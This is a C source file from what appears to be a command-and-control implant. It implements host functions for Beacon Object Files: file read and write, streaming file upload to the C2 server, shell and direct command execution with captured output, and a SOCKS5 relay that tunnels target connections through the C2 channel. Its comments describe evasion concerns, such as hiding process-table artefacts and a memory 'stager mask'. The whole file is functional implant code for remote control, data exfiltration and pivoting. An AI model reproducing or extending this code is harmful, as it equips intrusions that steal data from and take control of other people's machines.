/*
 * bof_host.c — the host primitives a BOF reaches through the loader.
 *
 * A BOF is untrusted: every path is either a canonical memfs key or a disk
 * path, reads are bounded, and an upload streams from the source instead of
 * materialising the file. Errors come back as a status plus a short message
 * the BOF can print.
 *
 * The SOCKS5 relay is the one primitive that outlives the BOF call: it starts
 * a manager thread that pipes a target socket to a C2 proxy stream until either
 * side closes. Only the agent main thread starts one, and only the main thread
 * reaps it (c2_bof_work_quiesce), so the thread table needs no lock.
 */

#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L

#include "bof_host.h"

#include "util/dynload.h"

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define C2_BOF_FILE_MAX (64u * 1024u * 1024u)

/* A command's captured output and its wall-clock budget. The output is one BOF
 * result; the budget bounds how long the message loop is blocked by a spawned
 * process. */
#define C2_EXEC_OUT_MAX (64u * 1024u)
#define C2_EXEC_TIMEOUT_S 30

/* Concurrent relay managers per agent, and how long one transport read may
 * block. The idle deadline is the BOF's policy and arrives per relay. */
#define C2_PROXY_MAX 128
#define C2_PROXY_READ_TIMEOUT_S 2
/* Bounds on a BOF-supplied idle deadline: a relay must end, or the agent can
 * never mask again. */
#define C2_RELAY_IDLE_MIN_S 1
#define C2_RELAY_IDLE_MAX_S (24 * 60 * 60)

/* Synchronous host operations in flight. They all run on the agent main thread,
 * so they already cannot overlap the idle mask; the counter turns that
 * invariant into something the sleep path can check. */
static int g_bof_ops;

static void bof_op_enter(void) {
  __atomic_add_fetch(&g_bof_ops, 1, __ATOMIC_RELAXED);
}

static void bof_op_leave(void) {
  __atomic_sub_fetch(&g_bof_ops, 1, __ATOMIC_RELAXED);
}

static void set_err(char *err, int cap, const char *msg) {
  if (err != NULL && cap > 0)
    snprintf(err, (size_t)cap, "%s", msg);
}

static void set_status_err(char *err, int cap, c2_status st) {
  set_err(err, cap, c2_status_str(st));
}

static void set_too_large_err(char *err, int err_cap) {
  if (err == NULL || err_cap <= 0)
    return;
  snprintf(err, (size_t)err_cap, "file too large (limit %lu bytes)",
           (unsigned long)C2_BOF_FILE_MAX);
}

static c2_status read_disk(const char *path, uint8_t **out, size_t *out_len) {
  *out = NULL;
  *out_len = 0;
  FILE *f = fopen(path, "rb");
  if (f == NULL)
    return C2_ERR_IO;
  if (fseeko(f, 0, SEEK_END) != 0) {
    fclose(f);
    return C2_ERR_IO;
  }
  off_t end = ftello(f);
  if (end < 0 || fseeko(f, 0, SEEK_SET) != 0) {
    fclose(f);
    return C2_ERR_IO;
  }
  size_t len = (size_t)end;
  if (len > C2_BOF_FILE_MAX) {
    fclose(f);
    return C2_ERR_OVERFLOW;
  }
  uint8_t *buf = (uint8_t *)malloc(len > 0 ? len : 1);
  if (buf == NULL) {
    fclose(f);
    return C2_ERR_NOMEM;
  }
  if (len > 0 && fread(buf, 1, len, f) != len) {
    free(buf);
    fclose(f);
    return C2_ERR_IO;
  }
  fclose(f);
  *out = buf;
  *out_len = len;
  return C2_OK;
}

static c2_status read_mem(c2_memfile *mem, const char *path, uint8_t **out,
                          size_t *out_len) {
  *out = NULL;
  *out_len = 0;
  char key[PATH_MAX];
  size_t key_len = c2_memfile_path_key(path, key, sizeof(key));
  if (key_len == 0)
    return C2_ERR_ARG;
  return c2_memfile_read_alloc(mem, c2_str_of(key, key_len), out, out_len);
}

static int bof_read_impl(void *vctx, const char *path, uint8_t **out,
                         size_t *len, char *err, int err_cap) {
  c2_bof_host_ctx *ctx = (c2_bof_host_ctx *)vctx;
  if (ctx == NULL || path == NULL || path[0] == '\0' || out == NULL ||
      len == NULL) {
    set_err(err, err_cap, "invalid argument");
    return C2_ERR_ARG;
  }
  *out = NULL;
  *len = 0;

  c2_status st;
  if (c2_memfile_is_path(path)) {
    st = read_mem(ctx->mem, path, out, len);
  } else {
    st = read_disk(path, out, len);
  }
  if (st == C2_ERR_OVERFLOW)
    set_too_large_err(err, err_cap);
  else if (st != C2_OK)
    set_status_err(err, err_cap, st);
  return (int)st;
}

static int bof_write_impl(void *vctx, const char *path, const uint8_t *data,
                          size_t len, char *err, int err_cap) {
  c2_bof_host_ctx *ctx = (c2_bof_host_ctx *)vctx;
  if (ctx == NULL || path == NULL || path[0] == '\0' ||
      (len > 0 && data == NULL)) {
    set_err(err, err_cap, "invalid argument");
    return C2_ERR_ARG;
  }

  if (c2_memfile_is_path(path)) {
    char key[PATH_MAX];
    size_t key_len = c2_memfile_path_key(path, key, sizeof(key));
    if (key_len == 0) {
      set_err(err, err_cap, "invalid memfs path");
      return C2_ERR_ARG;
    }
    c2_status st =
        c2_memfile_write(ctx->mem, c2_str_of(key, key_len), data, len);
    if (st != C2_OK)
      set_status_err(err, err_cap, st);
    return (int)st;
  }

  FILE *f = fopen(path, "wb");
  if (f == NULL) {
    set_err(err, err_cap, "cannot open destination");
    return C2_ERR_IO;
  }
  size_t wrote = len > 0 ? fwrite(data, 1, len, f) : 0;
  int failed = ferror(f) || wrote != len;
  if (fclose(f) != 0)
    failed = 1;
  if (failed) {
    set_err(err, err_cap, "cannot write destination");
    return C2_ERR_IO;
  }
  return C2_OK;
}

/* The session pulls upload chunks; a disk source reads on demand, a memfs
 * source is already in memory. */
static c2_status disk_chunk(void *vctx, uint8_t *out, size_t cap, size_t *len) {
  FILE *f = (FILE *)vctx;
  size_t n = fread(out, 1, cap, f);
  if (n == 0 && ferror(f))
    return C2_ERR_IO;
  *len = n;
  return C2_OK;
}

typedef struct {
  const uint8_t *data;
  size_t len;
  size_t off;
} mem_reader;

static c2_status mem_chunk(void *vctx, uint8_t *out, size_t cap, size_t *len) {
  mem_reader *r = (mem_reader *)vctx;
  size_t n = r->len - r->off;
  if (n > cap)
    n = cap;
  if (n > 0)
    memcpy(out, r->data + r->off, n);
  r->off += n;
  *len = n;
  return C2_OK;
}

static int bof_upload_impl(void *vctx, const char *token, const char *path,
                           unsigned long offset, char *err, int err_cap) {
  c2_bof_host_ctx *ctx = (c2_bof_host_ctx *)vctx;
  if (ctx == NULL || ctx->s == NULL || token == NULL || token[0] == '\0' ||
      path == NULL || path[0] == '\0') {
    set_err(err, err_cap, "invalid argument");
    return C2_ERR_ARG;
  }
  c2_str tok = c2_str_of(token, strlen(token));
  c2_status st;

  if (c2_memfile_is_path(path)) {
    char key[PATH_MAX];
    size_t key_len = c2_memfile_path_key(path, key, sizeof(key));
    if (key_len == 0) {
      set_err(err, err_cap, "invalid memfs path");
      return C2_ERR_ARG;
    }
    uint8_t *data = NULL;
    size_t len = 0;
    st = c2_memfile_read_alloc(ctx->mem, c2_str_of(key, key_len), &data, &len);
    if (st != C2_OK) {
      set_status_err(err, err_cap, st);
      return (int)st;
    }
    if ((size_t)offset > len) {
      free(data);
      set_err(err, err_cap, "offset past end of file");
      return C2_ERR_ARG;
    }
    mem_reader r = {data + offset, len - (size_t)offset, 0};
    st = c2_session_upload_stream(ctx->s, tok, mem_chunk, &r);
    free(data);
    if (st != C2_OK) {
      set_status_err(err, err_cap, st);
      return (int)st;
    }
    return C2_OK;
  }

  struct stat sb;
  if (stat(path, &sb) != 0) {
    set_err(err, err_cap, "cannot stat source file");
    return C2_ERR_IO;
  }
  if (!S_ISREG(sb.st_mode)) {
    set_err(err, err_cap, "source is not a regular file");
    return C2_ERR_ARG;
  }
  if (sb.st_size < 0 || (off_t)offset > sb.st_size) {
    set_err(err, err_cap, "offset past end of file");
    return C2_ERR_ARG;
  }
  FILE *f = fopen(path, "rb");
  if (f == NULL) {
    set_err(err, err_cap, "cannot open source file");
    return C2_ERR_IO;
  }
  if (offset > 0 && fseeko(f, (off_t)offset, SEEK_SET) != 0) {
    fclose(f);
    set_err(err, err_cap, "cannot seek source file");
    return C2_ERR_IO;
  }
  st = c2_session_upload_stream(ctx->s, tok, disk_chunk, f);
  fclose(f);
  if (st != C2_OK) {
    set_status_err(err, err_cap, st);
    return (int)st;
  }
  return C2_OK;
}

static int bof_sha256_impl(void *vctx, const uint8_t *data, size_t len,
                           char *hex, size_t hex_cap, char *err, int err_cap) {
  c2_bof_host_ctx *ctx = (c2_bof_host_ctx *)vctx;
  if (ctx == NULL || ctx->s == NULL || (len > 0 && data == NULL) ||
      hex == NULL || hex_cap < C2_SHA256_BYTES * 2 + 1) {
    set_err(err, err_cap, "invalid argument");
    return C2_ERR_ARG;
  }
  const c2_crypto_backend *be = ctx->s->be;
  void *be_ctx = be != NULL ? be->ctx : NULL;
  if (be == NULL || be->sha256 == NULL) {
    set_err(err, err_cap, "sha256 unavailable");
    return C2_ERR_UNSUPPORTED;
  }
  uint8_t digest[C2_SHA256_BYTES];
  if (be->sha256(be_ctx, data, len, digest) != 0) {
    set_err(err, err_cap, "sha256 failed");
    return C2_ERR_CRYPTO;
  }
  c2_hex_encode(digest, sizeof(digest), hex);
  hex[sizeof(digest) * 2] = '\0';
  return C2_OK;
}

/* ------------------------------------------------------------------------- */
/* Synchronous host operations                                                */
/* ------------------------------------------------------------------------- */

int c2_bof_host_read(void *vctx, const char *path, uint8_t **out, size_t *len,
                     char *err, int err_cap) {
  bof_op_enter();
  int rc = bof_read_impl(vctx, path, out, len, err, err_cap);
  bof_op_leave();
  return rc;
}

int c2_bof_host_write(void *vctx, const char *path, const uint8_t *data,
                      size_t len, char *err, int err_cap) {
  bof_op_enter();
  int rc = bof_write_impl(vctx, path, data, len, err, err_cap);
  bof_op_leave();
  return rc;
}

int c2_bof_host_upload(void *vctx, const char *token, const char *path,
                       unsigned long offset, char *err, int err_cap) {
  bof_op_enter();
  int rc = bof_upload_impl(vctx, token, path, offset, err, err_cap);
  bof_op_leave();
  return rc;
}

int c2_bof_host_sha256(void *vctx, const uint8_t *data, size_t len, char *hex,
                       size_t hex_cap, char *err, int err_cap) {
  bof_op_enter();
  int rc = bof_sha256_impl(vctx, data, len, hex, hex_cap, err, err_cap);
  bof_op_leave();
  return rc;
}

/* ------------------------------------------------------------------------- */
/* Command execution                                                         */
/* ------------------------------------------------------------------------- */

/* Milliseconds left of the budget. A failed clock read reports the budget. */
static long exec_remaining_ms(const struct timespec *start, int seconds) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
    return (long)seconds * 1000;
  long elapsed_ms = (now.tv_sec - start->tv_sec) * 1000L +
                    (now.tv_nsec - start->tv_nsec) / 1000000L;
  return (long)seconds * 1000L - elapsed_ms;
}

/* Split a command line the way a POSIX shell splits words, without expansion:
 * whitespace separates tokens, single quotes keep their bytes literally,
 * double quotes group and honour backslash, and a backslash outside single
 * quotes escapes the next byte. Writes the tokens into `out`, which must hold
 * at least twice the line length. Returns the token count, or -1 for an
 * unterminated quote or a full argv. */
static int exec_tokenize(const char *line, char *out, char **argv,
                         int argv_cap) {
  const char *rd = line;
  char *wr = out;
  int argc = 0;
  for (;;) {
    while (*rd == ' ' || *rd == '\t' || *rd == '\n' || *rd == '\r')
      rd++;
    if (*rd == '\0')
      break;
    if (argc == argv_cap - 1)
      return -1;
    argv[argc++] = wr;
    char quote = 0;
    while (*rd != '\0') {
      char c = *rd;
      if (quote == '\'') {
        if (c == '\'')
          quote = 0;
        else
          *wr++ = c;
        rd++;
        continue;
      }
      if (quote == '"') {
        if (c == '"') {
          quote = 0;
          rd++;
          continue;
        }
        if (c == '\\' && (rd[1] == '"' || rd[1] == '\\')) {
          *wr++ = rd[1];
          rd += 2;
          continue;
        }
        *wr++ = c;
        rd++;
        continue;
      }
      if (c == '\'' || c == '"') {
        quote = c;
        rd++;
        continue;
      }
      if (c == '\\' && rd[1] != '\0') {
        *wr++ = rd[1];
        rd += 2;
        continue;
      }
      if (c == ' ' || c == '\t' || c == '\n' || c == '\r')
        break;
      *wr++ = c;
      rd++;
    }
    if (quote != 0)
      return -1;
    *wr++ = '\0';
  }
  argv[argc] = NULL;
  return argc;
}

static int bof_exec_impl(void *vctx, const char *cmd, int shell, char *out,
                         size_t out_cap, char *err, int err_cap) {
  (void)vctx;
  if (cmd == NULL || cmd[0] == '\0' || out == NULL || out_cap < 2) {
    set_err(err, err_cap, "invalid argument");
    return C2_ERR_ARG;
  }
  if (out_cap > C2_EXEC_OUT_MAX)
    out_cap = C2_EXEC_OUT_MAX;
  out[0] = '\0';

  /* A direct exec still needs the agent's word splitting. It happens before
   * fork because malloc is not async-signal-safe in the child. */
  char *scratch = NULL;
  char **argv = NULL;
  if (shell == 0) {
    size_t len = strlen(cmd);
    scratch = (char *)malloc(3 * len + 2); /* the line copy, then the tokens */
    if (scratch == NULL) {
      set_err(err, err_cap, "out of memory");
      return C2_ERR_NOMEM;
    }
    memcpy(scratch, cmd, len + 1);
    int cap = (int)(len / 2 + 2);
    argv = (char **)calloc((size_t)cap, sizeof(*argv));
    if (argv == NULL) {
      free(scratch);
      set_err(err, err_cap, "out of memory");
      return C2_ERR_NOMEM;
    }
    if (exec_tokenize(scratch, scratch + len + 1, argv, cap) <= 0) {
      free(argv);
      free(scratch);
      set_err(err, err_cap, "invalid command line");
      return C2_ERR_ARG;
    }
  }

  /* The deadline is the only thing that bounds a spawned process; without a
   * monotonic clock the call would have no upper bound. */
  struct timespec start;
  if (clock_gettime(CLOCK_MONOTONIC, &start) != 0) {
    free(argv);
    free(scratch);
    set_err(err, err_cap, "clock unavailable");
    return C2_ERR_IO;
  }

  int p[2];
  if (pipe(p) != 0) {
    free(argv);
    free(scratch);
    set_err(err, err_cap, "cannot create pipe");
    return C2_ERR_IO;
  }
  pid_t pid = fork();
  if (pid < 0) {
    close(p[0]);
    close(p[1]);
    free(argv);
    free(scratch);
    set_err(err, err_cap, "cannot fork");
    return C2_ERR_IO;
  }
  if (pid == 0) {
    /* Only async-signal-safe calls between fork and exec: the agent may be
     * running relay threads whose locks must not be taken here. Inherited
     * descriptors would hand the C2 transport to the child. */
    dup2(p[1], STDOUT_FILENO);
    dup2(p[1], STDERR_FILENO);
    close(p[0]);
    close(p[1]);
    for (int fd = 3; fd < 1024; fd++)
      close(fd);
    if (shell != 0)
      execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
    else
      execvp(argv[0], argv);
    static const char cannot[] = "exec: cannot execute\n";
    (void)write(STDERR_FILENO, cannot, sizeof(cannot) - 1);
    _exit(127);
  }
  close(p[1]);

  size_t used = 0;
  int failed = 0;
  int timed_out = 0;
  int truncated = 0;
  for (;;) {
    long left = exec_remaining_ms(&start, C2_EXEC_TIMEOUT_S);
    if (left <= 0) {
      timed_out = 1;
      break;
    }
    struct pollfd pfd = {p[0], POLLIN, 0};
    int rc = poll(&pfd, 1, (int)left);
    if (rc < 0) {
      if (errno == EINTR)
        continue;
      failed = 1;
      break;
    }
    if (rc == 0) {
      timed_out = 1;
      break;
    }
    ssize_t n = read(p[0], out + used, out_cap - 1 - used);
    if (n < 0) {
      if (errno == EINTR)
        continue;
      failed = 1;
      break;
    }
    if (n == 0)
      break; /* the shell closed its output */
    used += (size_t)n;
    if (used == out_cap - 1) {
      truncated = 1;
      break;
    }
  }
  close(p[0]);
  out[used] = '\0';

  if (timed_out || truncated || failed)
    kill(pid, SIGKILL);

  /* Reap before returning: the process table is a detection artefact and a
   * zombie would outlive the BOF. */
  int status = 0;
  for (;;) {
    pid_t w = waitpid(pid, &status, WNOHANG);
    if (w == pid || (w < 0 && errno != EINTR))
      break;
    if (exec_remaining_ms(&start, C2_EXEC_TIMEOUT_S + 5) <= 0) {
      kill(pid, SIGKILL);
      while (waitpid(pid, &status, 0) < 0 && errno == EINTR)
        ;
      break;
    }
    struct timespec nap = {0, 20 * 1000 * 1000};
    nanosleep(&nap, NULL);
  }

  free(argv);
  free(scratch);
  if (timed_out) {
    set_err(err, err_cap, "command timed out");
    return C2_ERR_TIMEOUT;
  }
  if (failed) {
    set_err(err, err_cap, "cannot read command output");
    return C2_ERR_IO;
  }
  /* `used == out_cap - 1` tells the BOF its buffer filled up. */
  return (int)used;
}

int c2_bof_host_exec(void *vctx, const char *cmd, int shell, char *out,
                     size_t out_cap, char *err, int err_cap) {
  bof_op_enter();
  int rc = bof_exec_impl(vctx, cmd, shell, out, out_cap, err, err_cap);
  bof_op_leave();
  return rc;
}

/* ------------------------------------------------------------------------- */
/* SOCKS5 relay                                                              */
/* ------------------------------------------------------------------------- */

/*
 * The relay is the only agent feature with worker threads. Binary-translation
 * agents (and the raw PIC and shared-object deliverables) load the agent image
 * from memory without a dynamic dependency table, so pthread is resolved from
 * the libc segment at run time instead of being linked: an -pthread DT_NEEDED
 * entry would simply not be loaded there.
 */
typedef int (*c2_pthread_create_fn)(pthread_t *, const void *,
                                    void *(*)(void *), void *);
typedef int (*c2_pthread_join_fn)(pthread_t, void **);
typedef int (*c2_pthread_tryjoin_fn)(pthread_t, void **);

static c2_pthread_create_fn g_pthread_create;
static c2_pthread_join_fn g_pthread_join;
static c2_pthread_tryjoin_fn g_pthread_tryjoin;

/* Managers that were started and not yet reaped. Only the agent main thread
 * adds (c2_bof_host_relay) or removes (c2_bof_work_quiesce) entries, so the
 * table and g_bof_ops need no lock. */
static pthread_t g_relay_threads[C2_PROXY_MAX];
static size_t g_relay_thread_count;

static int pthread_runtime_load(void) {
  static int state; /* 0 = untried, 1 = ready, -1 = unavailable */
  if (state != 0)
    return state > 0 ? 0 : -1;

  unsigned long end = 0;
  unsigned long base = dynload_find_libc(&end);
  if (base != 0 && end > base) {
    size_t len = (size_t)(end - base);
    g_pthread_create = (c2_pthread_create_fn)dynload_resolve_module(
        (const void *)base, len, "pthread_create");
    g_pthread_join = (c2_pthread_join_fn)dynload_resolve_module(
        (const void *)base, len, "pthread_join");
    g_pthread_tryjoin = (c2_pthread_tryjoin_fn)dynload_resolve_module(
        (const void *)base, len, "pthread_tryjoin_np");
  }

  /* glibc before 2.34 keeps the thread entry points in libpthread.so.0. The
   * handle is deliberately never closed: the resolved pointers live in that
   * library for as long as the relay table can be joined. */
  if (g_pthread_create == NULL || g_pthread_join == NULL ||
      g_pthread_tryjoin == NULL) {
    dynload *dl = dynload_hosted();
    void *h = dynload_open(dl, "libpthread.so.0", RTLD_LAZY | RTLD_LOCAL);
    if (h != NULL) {
      if (g_pthread_create == NULL)
        g_pthread_create =
            (c2_pthread_create_fn)dynload_sym(dl, h, "pthread_create");
      if (g_pthread_join == NULL)
        g_pthread_join = (c2_pthread_join_fn)dynload_sym(dl, h, "pthread_join");
      if (g_pthread_tryjoin == NULL)
        g_pthread_tryjoin =
            (c2_pthread_tryjoin_fn)dynload_sym(dl, h, "pthread_tryjoin_np");
    }
  }

  if (g_pthread_create == NULL || g_pthread_join == NULL ||
      g_pthread_tryjoin == NULL) {
    state = -1;
    return -1;
  }
  state = 1;
  return 0;
}

/* One relayed connection: the C2 stream, the target socket and the last time
 * either direction moved a byte. */
typedef struct {
  c2_secureconn sc;
  int fd;
  int idle_s;
  uint64_t last_activity;
} c2_relay_ctx;

static void relay_touch(c2_relay_ctx *r) {
  __atomic_store_n(&r->last_activity, (uint64_t)time(NULL), __ATOMIC_RELAXED);
}

/* Tear both halves down so the peer worker unblocks and the manager can join. */
static void relay_stop(c2_relay_ctx *r) {
  c2_secureconn_abort(&r->sc);
  shutdown(r->fd, SHUT_RDWR);
}

/* target -> C2. poll() rather than a blocking recv so an idle relay whose C2 has
 * gone away still notices the wall clock and releases the agent. */
static void *relay_target_to_c2(void *arg) {
  c2_relay_ctx *r = (c2_relay_ctx *)arg;
  uint8_t buf[8192];
  for (;;) {
    struct pollfd pfd = {r->fd, POLLIN, 0};
    int rc;
    do {
      rc = poll(&pfd, 1, 1000);
    } while (rc < 0 && errno == EINTR);
    if (rc < 0) {
      relay_stop(r);
      return NULL;
    }
    if (rc == 0) {
      uint64_t last = __atomic_load_n(&r->last_activity, __ATOMIC_RELAXED);
      uint64_t now = (uint64_t)time(NULL);
      if (now > last && now - last > (uint64_t)r->idle_s) {
        relay_stop(r);
        return NULL;
      }
      continue;
    }
    if ((pfd.revents & (POLLHUP | POLLERR | POLLNVAL)) != 0) {
      relay_stop(r);
      return NULL;
    }
    ssize_t n = recv(r->fd, buf, sizeof(buf), 0);
    if (n < 0 && errno == EINTR)
      continue;
    if (n <= 0) {
      relay_stop(r);
      return NULL;
    }
    relay_touch(r);
    if (c2_secureconn_write_bulk(&r->sc, buf, (size_t)n) != C2_OK) {
      relay_stop(r);
      return NULL;
    }
    relay_touch(r);
  }
}

/* C2 -> target. The read has a deadline (c2_secureconn_set_timeout), so an
 * aborted stream ends this worker within one deadline. */
static void *relay_c2_to_target(void *arg) {
  c2_relay_ctx *r = (c2_relay_ctx *)arg;
  uint8_t buf[8192];
  for (;;) {
    long n = c2_secureconn_read(&r->sc, buf, sizeof(buf));
    if (n <= 0) {
      relay_stop(r);
      return NULL;
    }
    relay_touch(r);
    size_t off = 0;
    while (off < (size_t)n) {
      ssize_t w = send(r->fd, buf + off, (size_t)n - off, MSG_NOSIGNAL);
      if (w < 0) {
        if (errno == EINTR)
          continue;
        relay_stop(r);
        return NULL;
      }
      off += (size_t)w;
    }
    relay_touch(r);
  }
}

static void relay_join(pthread_t t) {
  while (g_pthread_join(t, NULL) == EINTR)
    ;
}

/* Owns one relay: starts the two workers, waits for both, then releases the
 * stream and the socket. It never returns while a worker is unjoined, because
 * the stager mask may only run once no other thread executes agent code. */
static void *relay_manager(void *arg) {
  c2_relay_ctx *r = (c2_relay_ctx *)arg;
  pthread_t up, down;
  int have_up = g_pthread_create(&up, NULL, relay_target_to_c2, r) == 0;
  if (!have_up)
    c2_secureconn_abort(&r->sc);
  int have_down =
      have_up && g_pthread_create(&down, NULL, relay_c2_to_target, r) == 0;
  if (have_up && !have_down) {
    c2_secureconn_abort(&r->sc);
    shutdown(r->fd, SHUT_RDWR);
  }

  if (have_up)
    relay_join(up);
  if (have_down)
    relay_join(down);

  c2_secureconn_close(&r->sc);
  close(r->fd);
  free(r);
  return NULL;
}

int c2_bof_work_quiesce(void) {
  if (g_relay_thread_count > 0 && g_pthread_tryjoin != NULL) {
    size_t kept = 0;
    for (size_t i = 0; i < g_relay_thread_count; i++) {
      void *ret = NULL;
      int rc = g_pthread_tryjoin(g_relay_threads[i], &ret);
      if (rc == 0)
        continue; /* the manager exited and is already reaped */
      g_relay_threads[kept++] = g_relay_threads[i];
    }
    g_relay_thread_count = kept;
  }
  return (g_relay_thread_count > 0 || g_bof_ops != 0) ? 1 : 0;
}

/* Take ownership of a connected socket and pump it through the C2 stream named
 * by `token`. Everything before this point (argument handling, resolution,
 * dialing, its own error text) belongs to the BOF; everything after it must run
 * on an agent thread, because the loader unmaps the object once the entry point
 * returns and the RV32 guest cannot create threads. */
int c2_bof_host_relay(void *vctx, const char *token, int fd, int idle_seconds,
                      char *err, int err_cap) {
  c2_bof_host_ctx *ctx = (c2_bof_host_ctx *)vctx;
  if (ctx == NULL || ctx->s == NULL || ctx->s->config == NULL ||
      token == NULL || token[0] == '\0' || fd < 0) {
    if (fd >= 0)
      close(fd);
    set_err(err, err_cap, "invalid argument");
    return C2_ERR_ARG;
  }
  if (idle_seconds < C2_RELAY_IDLE_MIN_S)
    idle_seconds = C2_RELAY_IDLE_MIN_S;
  if (idle_seconds > C2_RELAY_IDLE_MAX_S)
    idle_seconds = C2_RELAY_IDLE_MAX_S;

  c2_bof_work_quiesce();
  if (g_relay_thread_count >= C2_PROXY_MAX) {
    close(fd);
    set_err(err, err_cap, "too many relays");
    return C2_ERR_NOMEM;
  }
  if (pthread_runtime_load() != 0) {
    close(fd);
    set_err(err, err_cap, "thread runtime unavailable");
    return C2_ERR_UNSUPPORTED;
  }

  c2_secureconn sc;
  c2_status st = c2_session_open_route(ctx->s, ctx->s->config->routes.proxy,
                                       c2_str_of(token, strlen(token)), &sc);
  if (st != C2_OK) {
    close(fd);
    set_status_err(err, err_cap, st);
    return (int)st;
  }
  st = c2_secureconn_set_timeout(&sc, C2_PROXY_READ_TIMEOUT_S);
  if (st != C2_OK) {
    c2_secureconn_close(&sc);
    close(fd);
    set_status_err(err, err_cap, st);
    return (int)st;
  }

  c2_relay_ctx *r = (c2_relay_ctx *)calloc(1, sizeof(*r));
  if (r == NULL) {
    c2_secureconn_close(&sc);
    close(fd);
    set_err(err, err_cap, "out of memory");
    return C2_ERR_NOMEM;
  }
  r->sc = sc;
  r->fd = fd;
  r->idle_s = idle_seconds;
  relay_touch(r);

  pthread_t manager;
  if (g_pthread_create(&manager, NULL, relay_manager, r) != 0) {
    c2_secureconn_close(&r->sc);
    close(r->fd);
    free(r);
    set_err(err, err_cap, "cannot start relay");
    return C2_ERR_NOMEM;
  }
  g_relay_threads[g_relay_thread_count++] = manager;
  return C2_OK;
}
